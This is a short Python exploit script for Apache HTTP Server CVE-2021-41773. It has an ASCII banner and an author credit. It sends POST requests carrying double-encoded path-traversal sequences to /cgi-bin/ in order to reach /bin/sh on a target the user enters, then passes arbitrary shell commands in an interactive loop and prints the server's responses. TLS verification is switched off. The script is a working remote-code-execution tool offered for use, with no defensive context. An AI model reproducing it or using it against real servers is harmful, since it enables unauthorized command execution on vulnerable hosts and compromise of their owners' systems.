# Mass check Apache CVE-2021-41773
# Just4Fun
# Coded by Justakazh


import sys
import requests
from multiprocessing.dummy import Pool
from requests.packages.urllib3.exceptions import InsecureRequestWarning

requests.packages.urllib3.disable_warnings(InsecureRequestWarning)



print("""
	APACHE RCE
 _____ _   _ _____ 
/  __ \ | | |  ___|
| /  \/ | | | |__  
| |   | | | |  __| 
| \__/\ \_/ / |___ 
 \____/\___/\____/ -2021-41773
Coded By: Justakazh
FB: fb.com/justakazh

input target without http/s
                    """)

def jan_Cok(target, commands):
	try:
		a = target.strip().replace("http://", "").replace("https://", "").replace("/", "")
		url = "http://{}/cgi-bin/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/%%32%65%%32%65/bin/sh".format(a)

		s = requests.Session()
		req = requests.Request(method='POST' , url=url, data="echo; "+commands)
		prep = req.prepare()
		prep.url = url
		r = s.send(prep, verify=False, timeout=10)

		print(r.text)
		
	except:
		pass
target = str(input("Target : "))
while 1:
  commands = str(input("Cmd : "))
  jan_Cok(target,commands)
